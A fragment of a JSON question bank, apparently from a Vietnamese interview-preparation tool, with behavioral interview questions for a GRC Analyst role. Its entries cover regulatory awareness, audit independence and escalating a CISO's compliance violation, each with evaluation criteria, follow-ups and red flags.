          "Executive Persuasion",
          "Risk-to-Cost Translation",
          "ROI Justification",
          "Tone from the Top"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chấp nhận im lặng khi lãnh đạo cắt giảm ngân sách bảo mật xuống mức nguy hiểm"
        ]
      },
      {
        "id": "GRC-BEHAV-04",
        "role": "GRC Analyst",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Lĩnh vực GRC liên tục có các quy định pháp luật mới (AI Act EU, Nghị định 13 VN, SEC Cybersecurity Disclosure Rules) và các phiên bản tiêu chuẩn cập nhật (ISO 27001:2022, PCI DSS 4.0). Em duy trì việc cập nhật kiến thức pháp lý và tiêu chuẩn ra sao?",
        "evaluationCriteria": [
          "Xây dựng mạng lưới thông tin: Tham gia các hiệp hội nghề nghiệp (ISACA, (ISC)², VNISA), đăng ký nhận bản tin từ các công ty tư vấn pháp lý",
          "Học tập có hệ thống: Đăng ký các khóa CPE (Continuing Professional Education) bắt buộc để duy trì chứng chỉ CISA/CRISC",
          "Chia sẻ nội bộ: Tổng hợp và gửi bản tin quy định mới cho các bộ phận liên quan trong công ty"
        ],
        "followUps": [
          "Quy định mới nào gần đây nhất mà em phải nghiên cứu và áp dụng cho doanh nghiệp?",
          "Cách cân bằng giữa tuân thủ chính xác quy định với thực tế vận hành kinh doanh?"
        ],
        "tags": [
          "Regulatory Awareness",
          "Continuous Learning",
          "Professional Development",
          "Knowledge Dissemination"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Ngại cập nhật quy định pháp luật mới, áp dụng máy móc các quy trình tuân thủ cũ kỹ không còn phù hợp"
        ]
      },
      {
        "id": "GRC-BEHAV-05",
        "role": "GRC Analyst",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Trong một cuộc kiểm toán, em phát hiện một quy trình quan trọng không tuân thủ nhưng chính Giám đốc An ninh Thông tin (CISO) lại là người chỉ đạo bỏ qua quy trình đó để tiết kiệm thời gian. Em xử lý tình huống tế nhị này ra sao để vừa đảm bảo tính trung thực của kết quả kiểm toán vừa giữ được mối quan hệ công việc?",
        "evaluationCriteria": [
          "Giữ vững tính độc lập và chính trực: Phát hiện kiểm toán phải được ghi nhận đầy đủ và trung thực bất kể người vi phạm là ai; đây là nguyên tắc đạo đức nghề nghiệp không thể thương lượng",
          "Giao tiếp tôn trọng 1-1: Trao đổi riêng với CISO về phát hiện, lắng nghe lý do và bối cảnh; tuy nhiên không xóa hoặc giảm nhẹ mức độ nghiêm trọng trong báo cáo",
          "Leo thang nếu cần: Nếu CISO yêu cầu che giấu, báo cáo lên Ủy ban Kiểm toán (Audit Committee) hoặc Ban Kiểm soát theo đúng quy trình whistleblowing của tổ chức"
        ],
        "followUps": [
          "Tại sao tính độc lập (Independence) là giá trị sống còn của một Kiểm toán viên nội bộ?",
          "Cách xây dựng cơ chế bảo vệ người báo cáo vi phạm (Whistleblower Protection)?"
        ],
        "tags": [
          "Audit Independence",
          "Ethical Dilemma",
          "Whistleblower Reporting",
          "Professional Integrity"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Sửa báo cáo kiểm toán để che giấu vi phạm theo yêu cầu của cấp trên"
        ]
      }
    ]
  }
];
